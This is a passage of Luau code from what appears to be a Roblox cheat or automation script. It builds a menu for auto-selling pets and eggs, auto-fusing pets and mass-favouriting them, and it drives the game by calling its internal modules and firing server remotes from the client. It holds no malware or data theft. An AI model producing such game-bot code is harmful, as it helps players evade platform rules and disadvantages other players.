				isScrambleRunning = true
				scrambleActionStamp = os.clock() + scrambleBatchSize

				task.spawn(function()
					pcall(invokeScrambleBatch, scrambleList, tradeInList)
					isScrambleRunning = false
					taskScheduler.Wake()
				end)
			end

			taskScheduler.Add(function()
				local isScrambleOn = chilliState.Toggle(scrambleLoopHandle, false)
				local isTradeInOn = chilliState.Toggle(tradeInLoopHandle, false)
				local scrambleList, scrambleVal = getEggsToScramble()
				local tradeInList, tradeInVal = getEggsToTradeIn()

				if scrambleStatusRow and type(scrambleStatusRow.Set) == "function" then
					pcall(scrambleStatusRow.Set, scrambleStatusRow, string.format("Pet matches  -  %d pets for %s", #scrambleList, formatScrambleCurrency(scrambleVal)))
				end

				if tradeInStatusRow and type(tradeInStatusRow.Set) == "function" then
					pcall(tradeInStatusRow.Set, tradeInStatusRow, string.format("Egg matches  -  %d eggs for %s", #tradeInList, formatScrambleCurrency(tradeInVal)))
				end

				local runningCheck = isScrambleRunning
				local canAction

				if isScrambleRunning then
					canAction = runningCheck
				else
					canAction = os.clock() < scrambleActionStamp
				end

				local shouldSkip

				if canAction then
					shouldSkip = canAction
				else
					shouldSkip = not (isScrambleOn or isTradeInOn)
				end

				if shouldSkip then
					return false
				end
				executeScrambleAction(isScrambleOn and scrambleList or {}, isTradeInOn and tradeInList or {})
				return false
			end)

			scrambleStatusRow = autoSellSection:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })

			scrambleLoopHandle = autoSellSection:CreateToggle({
				Name = "Auto Sell Pet",
				Default = false,
				Callback = function()
					taskScheduler.Wake()
				end,
			})

			autoSellSection:CreateButton({
				Name = "Sell Pets Now",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = scrambleLoopHandle,
				Callback = function()
					executeScrambleAction(getEggsToScramble(), {})
				end,
			})

			autoSellSection:CreateDropdown({
				Name = "Sell Pet Rule",
				Note = "Which checks must pass to sell",
				Options = scrambleModes,
				Default = scrambleModes[1],
				SubOf = scrambleLoopHandle,
				Callback = function(val)
					if table.find(scrambleModes, val) then
						scrambleMode = val
						taskScheduler.Wake()
					end
				end,
			})

			autoSellSection:CreateDropdown({
				Name = "Pet Max Rarity",
				Note = "Sell pets at or below this rarity",
				Options = scrambleRarityList,
				Default = getScrambleRarityStr(3),
				SubOf = scrambleLoopHandle,
				Callback = function(val)
					scrambleMaxRarity = scrambleRarityMap[val] or scrambleMaxRarity
					taskScheduler.Wake()
				end,
			})

			local multiplierMap = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local function createMinIncomeSlider(name, note, parent, callback)
				local valNum = 0
				local valSuffix = "M/s"

				local function updateVal(numArg, strArg)
					if numArg ~= nil then
						valNum = math.max(0, math.floor(tonumber(numArg) or valNum))
					end

					if strArg ~= nil then
						valSuffix = tostring(strArg)
					end

					callback(valNum * (multiplierMap[valSuffix] or multiplierMap["M/s"]).Mult)
					taskScheduler.Wake()
				end

				return (formatNumberSuffix(autoSellSection, {
					Name = name == "Pet Value Threshold" and "Pet Sell Value" or name == "Egg Value Threshold" and "Egg Sell Value" or name,
					Note = note,
					SubOf = parent,
					Legacy = name,
					SectionName = "Auto Sell",
					OnRaw = function(numArg)
						updateVal(math.floor(numArg / 1000), "K/s")
					end,
				}))
			end

			createMinIncomeSlider("Pet Value Threshold", "Sell pets worth less than this (0 = off)", scrambleLoopHandle, function(val)
				scrambleMaxIncome = val
			end)

			local keepMutToggle = nil

			keepMutToggle = autoSellSection:CreateToggle({
				Name = "Keep Mutated Pets",
				Note = "Never sell mutated pets",
				Default = true,
				SubOf = scrambleLoopHandle,
				Callback = function()
					scrambleKeepMutations = chilliState.Toggle(keepMutToggle, true)
					taskScheduler.Wake()
				end,
			})

			hookDropdownAllLabel(autoSellSection:CreateMultiDropdown({
				Name = "Blacklist Sell Pets",
				Note = "These pets are never sold",
				Options = scrambleEggOptions,
				Default = {},
				SubOf = scrambleLoopHandle,
				Callback = function(val)
					scrambleIgnoredCategories = parseIgnoredCategories(val, scrambleEggToCategoryMap)
					taskScheduler.Wake()
				end,
			}))

			tradeInStatusRow = autoSellSection:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })

			tradeInLoopHandle = autoSellSection:CreateToggle({
				Name = "Auto Sell Egg",
				Note = "Sell bag eggs matching the rules below",
				Default = false,
				Callback = function()
					taskScheduler.Wake()
				end,
			})

			autoSellSection:CreateButton({
				Name = "Sell Eggs Now",
				Note = "Sell matching eggs once",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = tradeInLoopHandle,
				Callback = function()
					local tradeInList = getEggsToTradeIn()
					executeScrambleAction({}, tradeInList)
				end,
			})

			autoSellSection:CreateDropdown({
				Name = "Sell Egg Rule",
				Note = "Which checks must pass to sell",
				Options = scrambleModes,
				Default = scrambleModes[1],
				SubOf = tradeInLoopHandle,
				Callback = function(val)
					if table.find(scrambleModes, val) then
						tradeInMode = val
						taskScheduler.Wake()
					end
				end,
			})

			autoSellSection:CreateDropdown({
				Name = "Egg Max Rarity",
				Note = "Sell eggs at or below this rarity",
				Options = scrambleRarityList,
				Default = getScrambleRarityStr(3),
				SubOf = tradeInLoopHandle,
				Callback = function(val)
					tradeInMaxRarity = scrambleRarityMap[val] or tradeInMaxRarity
					taskScheduler.Wake()
				end,
			})

			createMinIncomeSlider("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", tradeInLoopHandle, function(val)
				tradeInMaxIncome = val
			end)

			local tradeInKeepMutToggle = nil

			tradeInKeepMutToggle = autoSellSection:CreateToggle({
				Name = "Keep Mutated Eggs",
				Note = "Never sell mutated eggs",
				Default = true,
				SubOf = tradeInLoopHandle,
				Callback = function()
					tradeInKeepMutations = chilliState.Toggle(tradeInKeepMutToggle, true)
					taskScheduler.Wake()
				end,
			})

			hookDropdownAllLabel(autoSellSection:CreateMultiDropdown({
				Name = "Blacklist Sell Eggs",
				Note = "These eggs are never sold",
				Options = scrambleEggOptions,
				Default = {},
				SubOf = tradeInLoopHandle,
				Callback = function(val)
					tradeInIgnoredCategories = parseIgnoredCategories(val, scrambleEggToCategoryMap)
					taskScheduler.Wake()
				end,
			}))
		end

		local saveModule = gameModules.Save

		if type(saveModule) == "table" and type(saveModule.FieldSignal) == "function" then
			for _, fieldName in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
				local ok, fieldSignal = pcall(saveModule.FieldSignal, fieldName)

				if ok and type(fieldSignal) == "table" and type(fieldSignal.Connect) == "function" then
					local ok2, conn = pcall(fieldSignal.Connect, fieldSignal, function()
						taskScheduler.Wake()
					end)

					if ok2 and conn then
						trackCleanup(function()
							pcall(function()
								conn:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local fuseActionCooldown = 2
		local fuseBatchSize = 3
		local maxFuseBatchCount = 20
		local fuseSortModes = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
		local fuseFilterModes = { "Lowest To Highest", "Highest To Lowest" }
		local fuseRarityList = {}
		local fuseRarityMap = {}
		local fuseEggOptions = {}
		local fuseEggToCategoryMap = {}

		do
			local assetsDir = gameModules.Assets and gameModules.Assets.Directory
			local fuseRarityNumToName = {}
			local sortedFuseEggs = {}

			if type(assetsDir) == "table" then
				for catId, catData in pairs(assetsDir) do
					local rarityVal = type(catData) == "table" and catData.Rarity or nil
					local rarityNum = type(rarityVal) == "table"

					if rarityNum then
						rarityNum = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
					end

					local finalRarityNum = rarityNum or nil

					if finalRarityNum then
						local rarityName = tostring(rarityVal.DisplayName or rarityVal._id or finalRarityNum)
						fuseRarityNumToName[finalRarityNum] = fuseRarityNumToName[finalRarityNum] or rarityName
						local eggInfo = { Category = tostring(catId) }
						local displayName = catData.DisplayName or catId
						eggInfo.Name = tostring(displayName)
						eggInfo.Rarity = finalRarityNum
						eggInfo.RarityName = rarityName
						table.insert(sortedFuseEggs, eggInfo)
					end
				end
			end

			local sortedRarityNums = {}

			for rarityNum in pairs(fuseRarityNumToName) do
				table.insert(sortedRarityNums, rarityNum)
			end

			table.sort(sortedRarityNums)

			for _, rarityNum in ipairs(sortedRarityNums) do
				local rarityStr = string.format("%d - %s", rarityNum, fuseRarityNumToName[rarityNum])
				table.insert(fuseRarityList, rarityStr)
				fuseRarityMap[rarityStr] = rarityNum
			end

			table.sort(sortedFuseEggs, function(e1, e2)
				if e1.Rarity ~= e2.Rarity then
					return e1.Rarity < e2.Rarity
				end
				return e1.Name < e2.Name
			end)

			for _, eggInfo in ipairs(sortedFuseEggs) do
				local eggLabel = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

				if fuseEggToCategoryMap[eggLabel] then
					eggLabel = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
				end

				table.insert(fuseEggOptions, eggLabel)
				fuseEggToCategoryMap[eggLabel] = eggInfo.Category
			end
		end

		do
			local function getFuseRarityStr(num)
				for _, rarityStr in ipairs(fuseRarityList) do
					if fuseRarityMap[rarityStr] == num then
						return rarityStr
					end
				end

				return fuseRarityList[#fuseRarityList]
			end

			local autoFuseHandle = nil
			local fuseStatusRow = nil
			local fuseSortMode = fuseSortModes[1]
			local fuseFilterMode = fuseFilterModes[1]
			local fuseMaxRarity = 6
			local fuseWhitelist = {}
			local fuseKeepMutations = true
			local fuseRespectTeam = true
			local isFuseRunning = false
			local fuseActionCount = 0
			local lastFuseStamp = 0
			local fuseFunds = 0
			local fuseFailCache = {}

			local function invokeRemote(name, arg2)
				local remoteFunction = networking:FindFirstChild(name)
				if not remoteFunction or not remoteFunction:IsA("RemoteFunction") then
					return false, nil
				end

				if arg2 == nil then
					return pcall(remoteFunction.InvokeServer, remoteFunction)
				end
				return pcall(remoteFunction.InvokeServer, remoteFunction, arg2)
			end

			local function getFuseSaveData()
				local saveModule = gameModules.Save
				if type(saveModule) ~= "table" or type(saveModule.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(saveModule.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function getAssetCategoryData(categoryId)
				local assetsDir = gameModules.Assets and gameModules.Assets.Directory
				return type(assetsDir) == "table" and assetsDir[tostring(categoryId)] or nil
			end

			local function getAssetRarityNum(categoryId)
				local catData = getAssetCategoryData(categoryId)
				local rarity = type(catData) == "table" and catData.Rarity or nil
				local rarityNum = type(rarity) == "table"

				if rarityNum then
					rarityNum = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return rarityNum or math.huge
			end

			local function getAssetDisplayName(categoryId)
				local catData = getAssetCategoryData(categoryId)
				return tostring(type(catData) == "table" and catData.DisplayName or categoryId)
			end

			local function getFuseEggIncome(eggData)
				local catData = getAssetCategoryData(eggData.Category)
				local baseRate = type(catData) == "table" and tonumber(catData.EarningRate) or 0
				local eggScale = tonumber(eggData.Scale) or 0
				if baseRate <= 0 or eggScale <= 0 then
					return 0
				end
				local scaleMult = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
				local mutations = gameModules.Mutations
				local hasMut = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local mutationMult = 1

				if hasMut then
					local ok
					ok, mutationMult = pcall(mutations.EarningsFor, type(eggData.Mutations) == "table" and eggData.Mutations or {})
					local isNumber = ok and type(mutationMult) == "number"
					local defaultMult = 1

					if not isNumber then
						mutationMult = defaultMult
					end
				end

				return baseRate * scaleMult * mutationMult
			end

			local function hasMutations(muts)
				return type(muts) == "table" and next(muts) ~= nil
			end

			local function formatFuseCurrency(val)
				local num = tonumber(val) or 0
				local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local suffixIdx = 1

				while math.abs(num) >= 1000 and suffixIdx < #suffixes do
					num /= 1000
					suffixIdx += 1
				end

				return string.format(suffixIdx == 1 and "$%.0f%s" or "$%.2f%s", num, suffixes[suffixIdx])
			end

			local function getFusePrice(count)
				local fuseKernel = gameModules.FuseKernel
				if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
					return nil
				end
				local ok, result = pcall(fuseKernel.PriceFor, count)
				return ok and tonumber(result) or nil
			end

			local function isOkToFuse(uid, eggData, equippedSet)
				local isOk = type(eggData) == "table" and eggData.IsFavorite ~= true and not equippedSet[uid] and getAssetRarityNum(eggData.Category) <= fuseMaxRarity and (next(fuseWhitelist) == nil or fuseWhitelist[tostring(eggData.Category)] == true)
				local shouldKeep

				if isOk then
					shouldKeep = not (fuseKeepMutations and hasMutations(eggData.Mutations))
				else
					shouldKeep = isOk
				end

				if shouldKeep then
					shouldKeep = (fuseFailCache[uid] or 0) <= os.clock()
				end

				return shouldKeep
			end

			local function getFuseBatch(saveData)
				local inventory = type(saveData.Inventory) == "table" and saveData.Inventory or {}
				local equippedSet = {}
				local pairsFn = pairs
				local equippedAssets = saveData.EquippedAssets or {}

				for _, equippedAsset in pairsFn(equippedAssets) do
					equippedSet[equippedAsset] = true
				end

				local loadedSlots = {}
				local loadedSet = {}

				for i = 1, fuseBatchSize do
					local slotUid = type(saveData.FusionSlots) == "table" and saveData.FusionSlots[i] or nil

					if slotUid ~= nil and type(inventory[slotUid]) == "table" then
						table.insert(loadedSlots, slotUid)
						loadedSet[slotUid] = true
					end
				end

				local fuseGroups = {}

				for uid, eggData in pairs(inventory) do
					if not loadedSet[uid] and type(eggData) == "table" and eggData.InFuse ~= true and isOkToFuse(uid, eggData, equippedSet) then
						local catStr = tostring(eggData.Category)
						fuseGroups[catStr] = fuseGroups[catStr] or {}
						table.insert(fuseGroups[catStr], { Uid = uid, Item = eggData, Income = getFuseEggIncome(eggData) })
					end
				end

				local function sortFuseGroup(groupList)
					table.sort(groupList, function(a, b)
						if a.Income ~= b.Income then
							if fuseFilterMode == fuseFilterModes[2] then
								return a.Income > b.Income
							end
							return a.Income < b.Income
						end

						return tostring(a.Uid) < tostring(b.Uid)
					end)
				end

				if #loadedSlots > 0 then
					local loadedCat = tostring(inventory[loadedSlots[1]].Category)
					local isValidLoad = true

					for _, loadedUid in ipairs(loadedSlots) do
						local loadedEggData = inventory[loadedUid]

						if tostring(loadedEggData.Category) ~= loadedCat or not isOkToFuse(loadedUid, loadedEggData, equippedSet) then
							isValidLoad = false
						end
					end

					local loadedGroup = fuseGroups[loadedCat] or {}

					if isValidLoad and #loadedSlots + #loadedGroup >= fuseBatchSize then
						sortFuseGroup(loadedGroup)
						local batchData = { Category = loadedCat, Load = {}, Items = {} }

						for _, loadedUid in ipairs(loadedSlots) do
							table.insert(batchData.Items, inventory[loadedUid])
						end

						for i = 1, fuseBatchSize - #loadedSlots do
							table.insert(batchData.Load, loadedGroup[i].Uid)
							table.insert(batchData.Items, loadedGroup[i].Item)
						end

						return batchData
					end

					if fuseRespectTeam then
						return { Category = loadedCat, Eject = loadedSlots }
					end
					return nil, "Machine holds pets that cannot finish a fuse"
				end

				local bestScore = nil
				local bestCat = nil

				for catStr, group in pairs(fuseGroups) do
					if #group >= 3 then
						local catRarity = getAssetRarityNum(catStr)
						local totalIncome = 0

						for _, eggData in ipairs(group) do
							totalIncome += eggData.Income
						end

						local groupScore

						if fuseSortMode == fuseSortModes[2] then
							groupScore = { -catRarity, -#group }
						elseif fuseSortMode == fuseSortModes[3] then
							groupScore = { -#group, catRarity }
						elseif fuseSortMode == fuseSortModes[4] then
							groupScore = { totalIncome / #group, catRarity }
						else
							groupScore = { catRarity, -#group }
						end

						local isBetter = bestScore == nil or groupScore[1] < bestScore[1]
						local shouldUpdate

						if isBetter then
							shouldUpdate = isBetter
						else
							local isTie = groupScore[1] == bestScore[1]

							if isTie then
								local isSecondaryBetter = groupScore[2] < bestScore[2]

								if isSecondaryBetter then
									shouldUpdate = isSecondaryBetter
								else
									shouldUpdate = groupScore[2] == bestScore[2] and catStr < bestCat
								end
							else
								shouldUpdate = isTie
							end
						end

						if shouldUpdate then
							bestScore = groupScore
							bestCat = catStr
						end
					end
				end

				if not bestCat then
					return nil, "No three matching pets"
				end
				local bestGroup = fuseGroups[bestCat]
				sortFuseGroup(bestGroup)
				local batchData = { Category = bestCat, Load = {}, Items = {} }

				for i = 1, 3 do
					table.insert(batchData.Load, bestGroup[i].Uid)
					table.insert(batchData.Items, bestGroup[i].Item)
				end

				return batchData
			end

			local function executeFuseBatch(stamp)
				local saveData = getFuseSaveData()
				if not saveData then
					return
				end

				if saveData.FusionLocked == true then
					if type(saveData.FusionEggReward) == "table" and os.clock() >= lastFuseStamp then
						lastFuseStamp = os.clock() + 3
						invokeRemote("RF/Fusery/FinishReveal")
					end

					return
				end

				local batch = getFuseBatch(saveData)
				if not batch then
					return
				end

				if batch.Eject then
					for _, uidToEject in ipairs(batch.Eject) do
						if stamp ~= fuseActionCount then
							return
						end
						invokeRemote("RF/Fusery/EjectPet", uidToEject)
						task.wait(0.35)
					end

					return
				end

				local price = getFusePrice(batch.Items)
				local currentMoney = tonumber(saveData.Money)
				if price and currentMoney and currentMoney < price then
					return
				end

				for _, uidToLoad in ipairs(batch.Load) do
					if stamp ~= fuseActionCount then
						return
					end
					local loadOk, res = invokeRemote("RF/Fusery/LoadPet", uidToLoad)
					if not loadOk or res == false then
						fuseFailCache[uidToLoad] = os.clock() + maxFuseBatchCount
						return
					end
					task.wait(0.35)
				end

				if stamp ~= fuseActionCount then
					return
				end
				local fuseOk, res = invokeRemote("RF/Fusery/BeginFuse")

				if fuseOk and res ~= false then
					lastFuseStamp = os.clock() + 3
				end
			end

			local function getFuseStatusString(saveData)
				if not saveData then
					return "Fuse status unknown"
				end

				if saveData.FusionLocked == true then
					return "Machine is fusing, waiting for the egg"
				end
				local batch, err = getFuseBatch(saveData)
				if not batch then
					return err or "No three matching pets"
				end

				if batch.Eject then
					return string.format("Would eject %d %s that cannot finish a fuse", #batch.Eject, getAssetDisplayName(batch.Category))
				end
				local price = getFusePrice(batch.Items)
				local currentMoney = tonumber(saveData.Money)
				local notEnoughStr = price and currentMoney and currentMoney < price and "  (not enough money)" or ""
				return string.format("Next fuse  -  3 %s for %s%s", getAssetDisplayName(batch.Category), price and formatFuseCurrency(price) or "?", notEnoughStr)
			end

			taskScheduler.Add(function()
				local saveData = getFuseSaveData()

				if fuseStatusRow and type(fuseStatusRow.Set) == "function" then
					pcall(fuseStatusRow.Set, fuseStatusRow, getFuseStatusString(saveData))
				end

				if not chilliState.Toggle(autoFuseHandle, false) or isFuseRunning or os.clock() < fuseFunds then
					return false
				end
				isFuseRunning = true
				fuseFunds = os.clock() + fuseActionCooldown
				local currentStamp = fuseActionCount

				task.spawn(function()
					pcall(executeFuseBatch, currentStamp)
					isFuseRunning = false
					taskScheduler.Wake()
				end)

				return false
			end)

			fuseStatusRow = autoFuseSection:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })

			autoFuseHandle = autoFuseSection:CreateToggle({
				Name = "Auto Fuse Machine",
				Note = "Fuse 3 same pets into an egg, nonstop",
				Default = false,
				Callback = function()
					fuseActionCount += 1
					table.clear(fuseFailCache)
					fuseFunds = 0
					taskScheduler.Wake()
				end,
			})

			autoFuseSection:CreateDropdown({
				Name = "Fuse Priority Mode",
				Options = fuseSortModes,
				Default = fuseSortModes[1],
				SubOf = autoFuseHandle,
				Callback = function(arg)
					if table.find(fuseSortModes, arg) then
						fuseSortMode = arg
						taskScheduler.Wake()
					end
				end,
			})

			autoFuseSection:CreateDropdown({
				Name = "Pets To Use",
				Options = fuseFilterModes,
				Default = fuseFilterModes[1],
				SubOf = autoFuseHandle,
				Callback = function(val)
					if table.find(fuseFilterModes, val) then
						fuseFilterMode = val
						taskScheduler.Wake()
					end
				end,
			})

			autoFuseSection:CreateDropdown({
				Name = "Max Rarity to Fuse",
				Options = fuseRarityList,
				Default = getFuseRarityStr(6),
				SubOf = autoFuseHandle,
				Callback = function(val)
					fuseMaxRarity = fuseRarityMap[val] or fuseMaxRarity
					taskScheduler.Wake()
				end,
			})

			hookDropdownAllLabel(autoFuseSection:CreateMultiDropdown({
				Name = "Specific Species to Fuse",
				Note = "Only fuse these species (empty = all)",
				Options = fuseEggOptions,
				Default = {},
				SubOf = autoFuseHandle,
				Callback = function(valList)
					local whitelistMap = {}

					if type(valList) == "table" then
						for k, v in pairs(valList) do
							k = v == true and type(k) == "string" and k

							if k then
								v = k
							else
								v = type(v) == "string" and v
							end

							v = v or nil

							if v and fuseEggToCategoryMap[v] then
								whitelistMap[fuseEggToCategoryMap[v]] = true
							end
						end
					end

					fuseWhitelist = whitelistMap
					taskScheduler.Wake()
				end,
			}))

			local skipMutToggle = nil

			skipMutToggle = autoFuseSection:CreateToggle({
				Name = "Skip Mutated Pets",
				Default = true,
				SubOf = autoFuseHandle,
				Callback = function()
					fuseKeepMutations = chilliState.Toggle(skipMutToggle, true)
					taskScheduler.Wake()
				end,
			})

			local ejectIncompleteToggle = nil

			ejectIncompleteToggle = autoFuseSection:CreateToggle({
				Name = "Eject Incomplete Slots",
				Note = "Take out pets that can't make a set",
				Default = true,
				SubOf = autoFuseHandle,
				Callback = function()
					fuseRespectTeam = chilliState.Toggle(ejectIncompleteToggle, true)
					taskScheduler.Wake()
				end,
			})
		end

		local saveModule = gameModules.Save

		if type(saveModule) == "table" and type(saveModule.FieldSignal) == "function" then
			for _, fieldName in ipairs({
				"Inventory",
				"EquippedAssets",
				"FusionSlots",
				"FusionLocked",
				"FusionEggReward",
				"Money",
			}) do
				local ok, fieldSignal = pcall(saveModule.FieldSignal, fieldName)

				if ok and type(fieldSignal) == "table" and type(fieldSignal.Connect) == "function" then
					local ok2, conn = pcall(fieldSignal.Connect, fieldSignal, function()
						taskScheduler.Wake()
					end)

					if ok2 and conn then
						trackCleanup(function()
							pcall(function()
								conn:Disconnect()
							end)
						end)
					end
				end
			end
		end
	end

	do
		local mutateActionCooldown = 2
		local maxMutationsLimit = 25
		local mutateBatchSize = 4
		local mutateMatchModes = { "Match Any", "Match All" }
		local mutationTypes = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
		local anyMutString = "Any Mutation"
		local mutateRarityList = { "Off" }
		local mutateRarityMap = {}
		local mutateEggOptions = {}
		local mutateEggToCategoryMap = {}
		local mutateFilterOptions = { "Any Mutation" }
		local mutateFilterMap = {}
		local assetsDir = gameModules.Assets and gameModules.Assets.Directory
		local mutateRarityNumToName = {}
		local sortedMutateEggs = {}

		if type(assetsDir) == "table" then
			for catId, catData in pairs(assetsDir) do
				local rarityVal = type(catData) == "table" and catData.Rarity or nil
				local rarityNum = type(rarityVal) == "table"

				if rarityNum then
					rarityNum = tonumber(rarityVal.RarityNumber or rarityVal.Rank)
				end

				local finalRarityNum = rarityNum or nil

				if finalRarityNum then
					local rarityName = tostring(rarityVal.DisplayName or rarityVal._id or finalRarityNum)
					mutateRarityNumToName[finalRarityNum] = mutateRarityNumToName[finalRarityNum] or rarityName
					local eggInfo = { Category = tostring(catId) }
					local displayName = catData.DisplayName or catId
					eggInfo.Name = tostring(displayName)
					eggInfo.Rarity = finalRarityNum
					eggInfo.RarityName = rarityName
					table.insert(sortedMutateEggs, eggInfo)
				end
			end
		end

		local sortedRarityNums = {}

		for rarityNum in pairs(mutateRarityNumToName) do
			table.insert(sortedRarityNums, rarityNum)
		end

		table.sort(sortedRarityNums)

		for _, rarityNum in ipairs(sortedRarityNums) do
			local rarityStr = string.format("%d - %s", rarityNum, mutateRarityNumToName[rarityNum])
			table.insert(mutateRarityList, rarityStr)
			mutateRarityMap[rarityStr] = rarityNum
		end

		table.sort(sortedMutateEggs, function(e1, e2)
			if e1.Rarity ~= e2.Rarity then
				return e1.Rarity < e2.Rarity
			end
			return e1.Name < e2.Name
		end)

		for _, eggInfo in ipairs(sortedMutateEggs) do
			local eggLabel = string.format("%s [%s]", eggInfo.Name, eggInfo.RarityName)

			if mutateEggToCategoryMap[eggLabel] then
				eggLabel = string.format("%s [%s] (%s)", eggInfo.Name, eggInfo.RarityName, eggInfo.Category)
			end

			table.insert(mutateEggOptions, eggLabel)
			mutateEggToCategoryMap[eggLabel] = eggInfo.Category
		end

		local mutationsMetadataMap = {}
		local sortedMutations = {}
		local mutations = gameModules.Mutations

		if type(mutations) == "table" and type(mutations.IdSet) == "table" then
			for k in pairs(mutations.IdSet) do
				table.insert(sortedMutations, tostring(k))
			end
		end

		if #sortedMutations == 0 then
			sortedMutations = table.clone(mutationTypes)
		end

		table.sort(sortedMutations, function(a, b)
			return getAreaDisplayName(a) < getAreaDisplayName(b)
		end)

		for _, mutId in ipairs(sortedMutations) do
			local mutName = getAreaDisplayName(mutId)
			table.insert(mutateFilterOptions, mutName)
			mutateFilterMap[mutName] = mutId
		end

		local autoMutateHandle = nil
		local mutateStatusRow = nil
		local mutateButtonHandle = nil
		local mutateEquippedHandle = nil
		local mutateMatchMode = mutateMatchModes[2]
		local mutateMinRarity = nil
		local mutateAnyMutation = false
		local mutateTargetMutations = {}
		local mutateMinIncome = 0
		local mutateIgnoredCategories = {}
		local isMutateRunning = false
		local mutateActionStamp = 0
		local mutateFailCache = {}

		local function getMutateSaveData()
			local saveModule = gameModules.Save
			if type(saveModule) ~= "table" or type(saveModule.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(saveModule.Get)
			return ok and type(result) == "table" and result or nil
		end

		local function getAssetCategoryData(categoryId)
			local assetsDir = gameModules.Assets and gameModules.Assets.Directory
			return type(assetsDir) == "table" and assetsDir[tostring(categoryId)] or nil
		end

		local function getAssetRarityNum(categoryId)
			local catData = getAssetCategoryData(categoryId)
			local rarity = type(catData) == "table" and catData.Rarity or nil
			local rarityNum = type(rarity) == "table"

			if rarityNum then
				rarityNum = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return rarityNum or 0
		end

		local function getMutateEggIncome(eggData)
			local catData = getAssetCategoryData(eggData.Category)
			local baseRate = type(catData) == "table" and tonumber(catData.EarningRate) or 0
			local eggScale = tonumber(eggData.Scale) or 0
			if baseRate <= 0 or eggScale <= 0 then
				return 0
			end
			local scaleMult = eggScale > 5 and (eggScale / 5) ^ 1.2 * 19.637875755794113 or eggScale ^ 1.85
			local mutationsModule = gameModules.Mutations
			local hasMut = type(mutationsModule) == "table" and type(mutationsModule.EarningsFor) == "function"
			local mutationMult = 1

			if hasMut then
				local ok
				ok, mutationMult = pcall(mutationsModule.EarningsFor, type(eggData.Mutations) == "table" and eggData.Mutations or {})
				ok = ok and type(mutationMult) == "number"
				local defaultMult = 1

				if not ok then
					mutationMult = defaultMult
				end
			end

			return baseRate * scaleMult * mutationMult
		end

		local function getEggMutationsSet(eggData)
			local mutSet = {}

			if type(eggData.Mutations) == "table" then
				for k, mutation in pairs(eggData.Mutations) do
					if type(mutation) == "string" then
						mutSet[mutation] = true
					elseif mutation == true and type(k) == "string" then
						mutSet[k] = true
					end
				end
			end

			if type(eggData.BaseMutation) == "string" and eggData.BaseMutation ~= "" then
				mutSet[eggData.BaseMutation] = true
			end

			return mutSet
		end

		local function isMutateTarget(eggData)
			if mutateIgnoredCategories[tostring(eggData.Category)] then
				return true
			end
			local matchCount = 0
			local conditionCount = 0

			if mutateMinRarity then
				conditionCount = 1

				if getAssetRarityNum(eggData.Category) >= mutateMinRarity then
					matchCount = 1
				end
			end

			if mutateAnyMutation or next(mutateTargetMutations) ~= nil then
				conditionCount += 1
				local mutSet = getEggMutationsSet(eggData)

				if mutateAnyMutation and next(mutSet) ~= nil then
					matchCount += 1
				else
					local hasTarget = false

					for k in pairs(mutSet) do
						if mutateTargetMutations[k] then
							hasTarget = true
							break
						end
					end

					if hasTarget then
						matchCount += 1
					end
				end
			end

			if mutateMinIncome > 0 then
				conditionCount += 1

				if mutateMinIncome <= getMutateEggIncome(eggData) then
					matchCount += 1
				end
			end

			if conditionCount == 0 then
				return false
			end

			if mutateMatchMode == mutateMatchModes[2] then
				return matchCount == conditionCount
			end
			return matchCount > 0
		end

		local function isMutateFailed(uid)
			return (mutateFailCache[uid] or 0) > os.clock()
		end

		local function getEggsToMutate(saveData)
			local mutateList = {}
			local iter, t, i = pairs(saveData.Inventory or {})
			local count = 0

			for uid, eggData in iter, t, i do
				if type(eggData) == "table" and isMutateTarget(eggData) then
					count += 1

					if eggData.IsFavorite ~= true and not isMutateFailed(uid) then
						table.insert(mutateList, uid)
					end
				end
			end

			return mutateList, count
		end

		local function getEquippedToMutate(saveData, ignoreFilters, checkTargets)
			local mutateList = {}
			local inventory = saveData.Inventory or {}
			local pairsFn = pairs
			local equippedAssets = saveData.EquippedAssets or {}

			for _, equippedAsset in pairsFn(equippedAssets) do
				local eggData = inventory[equippedAsset]

				if type(eggData) == "table" and not isMutateFailed(equippedAsset) then
					if ignoreFilters then
						if eggData.IsFavorite ~= true then
							table.insert(mutateList, equippedAsset)
						end
					else
						local isFav = eggData.IsFavorite == true

						if isFav then
							isFav = not (checkTargets and isMutateTarget(eggData))
						end

						if isFav then
							table.insert(mutateList, equippedAsset)
						end
					end
				end
			end

			return mutateList
		end

		local function invokeWriteFavorite(uids, isFavorite)
			local reWriteFavorite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
			if not reWriteFavorite or not reWriteFavorite:IsA("RemoteEvent") then
				return
			end

			for i, uid in ipairs(uids) do
				if not (maxMutationsLimit < i) then
					mutateFailCache[uid] = os.clock() + mutateBatchSize
					pcall(reWriteFavorite.FireServer, reWriteFavorite, uid, isFavorite)
					task.wait(0.12)
					continue
				end

				break
			end
		end

		local function executeMutateBatch(uids, isFavorite)
			if isMutateRunning or #uids == 0 then
				return false
			end
			isMutateRunning = true
			mutateActionStamp = os.clock() + mutateActionCooldown

			task.spawn(function()
